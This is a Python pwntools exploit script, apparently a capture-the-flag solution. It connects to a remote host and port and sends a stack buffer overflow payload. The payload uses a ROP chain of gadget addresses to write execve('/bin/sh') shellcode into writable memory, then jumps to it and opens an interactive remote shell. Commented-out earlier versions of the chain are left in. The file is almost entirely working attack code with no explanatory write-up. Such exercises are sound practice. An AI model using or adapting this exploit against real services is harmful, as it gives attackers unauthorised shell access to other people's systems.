#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11003

yuan = remote(host,port)


shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91" + "\xd0\x8c\x97\xff\x48\xf7\xdb\x53" + "\x54\x5f\x99\x52\x57\x54\x5e\xb0" + "\x3b\x0f\x05"

payload = "a"*40


#payload += struct.pack("<I" , 0x0000000000437045) #pop rdx ; ret
#payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
#payload += struct.pack("<I" , 0x0000000000401693) #pop rdi ; ret
#payload += struct.pack("<I" , 0x00000000006c006a)
#payload += struct.pack("<I" , 0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
#payload += struct.pack("<I" , 0x0000000000437045) #pop rdx ; ret
#payload += "\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
#payload += struct.pack("<I" , 0x0000000000401693) #pop rdi ; ret
#payload += struct.pack("<I" , 0x00000000006c0072)
#payload += struct.pack("<I" , 0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
#payload += struct.pack("<I" , 0x0000000000437045) #pop rdx ; ret
#payload += "\x54\x5f\x99\x52\x57\x54\x5e\xb0"
#payload += struct.pack("<I" , 0x0000000000401693) #pop rdi ; ret
#payload += struct.pack("<I" , 0x00000000006c007a)
#payload += struct.pack("<I" , 0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
#payload += struct.pack("<I" , 0x0000000000437045) #pop rdx ; ret
#payload += "\x3b\x0f\x05\x00\x00\x00\x00\x00"
#payload += struct.pack("<I" , 0x0000000000401693) #pop rdi ; ret
#payload += struct.pack("<I" , 0x00000000006c0082)
#payload += struct.pack("<I" , 0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
#payload += struct.pack("<I" , 0x00000000006c0060)


payload += p64(0x0000000000437045) #pop rdx ; ret
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
payload += p64(0x0000000000401693) #pop rdi ; ret
payload += "\x00\x00\x00\x00\x00\x6c\x00\x6a"
payload += p64(0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
payload += p64(0x0000000000437045) #pop rdx ; ret
payload += "\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
payload += p64(0x0000000000401693) #pop rdi ; ret
payload += "\x00\x00\x00\x00\x00\x6c\x00\x72"
payload += p64(0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
payload += p64(0x0000000000437045) #pop rdx ; ret
payload += "\x54\x5f\x99\x52\x57\x54\x5e\xb0"
payload += p64(0x0000000000401693) #pop rdi ; ret
payload += "\x00\x00\x00\x00\x00\x6c\x00\x7a"
payload += p64(0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
payload += p64(0x0000000000437045) #pop rdx ; ret
payload += "\x3b\x0f\x05\x00\x00\x00\x00\x00"
payload += p64(0x0000000000401693) #pop rdi ; ret
payload += "\x00\x00\x00\x00\x00\x6c\x00\x82"
payload += p64(0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
payload += p64(0x00000000006c0060)
payload += p64(0x0000000000401066)



#payload += struct.pack("<I" , )
#payload += struct.pack("<I",0x000000000045b365)
#payload += struct.pack("<I" , 0x000000000041943c) #xor eax, eax ; pop rbx ; pop rbp ; ret
#payload += struct.pack("<I" , ) #
#00 00 00 00 00 40 10 66
#"\x66\x10\x40\x00\x00\x00\x00\x00"
yuan.sendline(payload)

yuan.interactive()

#canary = 0xaabbccddeeffabac
#payload += struct.pack("<I",0x000000000045b365)
#payload += p64(canary)

print payload
